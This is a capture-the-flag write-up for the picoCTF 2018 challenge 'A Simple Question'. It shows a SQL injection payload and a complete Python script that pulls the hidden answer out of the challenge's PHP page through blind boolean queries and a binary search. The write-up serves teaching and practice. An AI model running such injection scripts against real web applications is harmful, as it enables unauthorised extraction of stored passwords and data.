# A Simple Question
The challenge reads:
> There is a website running at http://2018shell3.picoctf.com:15987 ([link](http://2018shell3.picoctf.com:15987)). Try to see if you can answer its question.

Heading to the website we saw:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion1.png)

Typing in something to submit we saw the message saying that the answer is wrong.
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion2.png)

Look at the source code of the website, we can find a link to the source code of the php.
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion3.png)

Here is the php code:
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion4.png)

The code is as follows. If the answer is correct, then we get the flag! If there are more than one results returned, return "You are so close.", and else, return "Wrong." The interesting part is the middle one. The only situation where it will return more than one results is if we try to do a SQL injection attack on it. But we can't just use ```' or 1=1;--``` as our payload as it would just return "You are so close." Not very helpful.

Here, we need to brute force the flag out, but with a smart way. We need a way to know that for the first character, it is correct or not. If it is correct, we can brute force the second character, and so on. And the way to achieve that, is to realize that we can use the ```>=``` operator in SQL. If in ASCII encoding, the actual character is greater than the first character we guessed, we will get a "You are so close." An example with the payload ```' or 1=1 and answer >= '1' --``` returns
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion5.png)

And otherwise if the actual character is smaller, then we get a "wrong."
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion6.png)

The important observation is that if we guess a correct character, the query for the correct character will return "You are so close", where the query for the next character after the correct one will return "Wrong." Knowing this we can perform a binary search for all the characters of the password! The code is as follows:
```
import requests
from math import floor


def check(before, m):
    r = requests.post("http://2018shell3.picoctf.com:15987/answer2.php", data={'answer': "\'or 1=1 and answer >= \'" + before + chr(m) + "\'--", 'debug': 0})
    return r.text


def check_correct(flag):
    r = requests.post("http://2018shell3.picoctf.com:15987/answer2.php", data={'answer': flag, 'debug': 0})
    return r.text


START = 32
END = 127
CLOSE = "You are so close"
WRONG = "Wrong."


x = [i for i in range(START, END)]
i = START
j = END
password = ""
chk = ""
while True:
    while True:
        m = floor((i + j) / 2)
        print(f"{i} - {m} - {j}")
        text = check(password, m)
        if CLOSE in text:
            check_wrong = check(password, m + 1)
            if(WRONG in check_wrong):
                break
            print("Close!")
            i = m + 1
        elif WRONG in text:
            print("Wrong!")
            j = m
    print("Got one character!")
    password += chr(m)
    print(password)
    i = START
    j = END
    chk = check_correct(password)
    if WRONG not in chk and\
            CLOSE not in chk:
        break

print(f"Found it! The password is {password}")
print("Response: " + chk)

```
Running the script gives us the flag.
![](https://github.com/klwuco/picoCTF2018_writeups/blob/master/img/simplequestion7.png)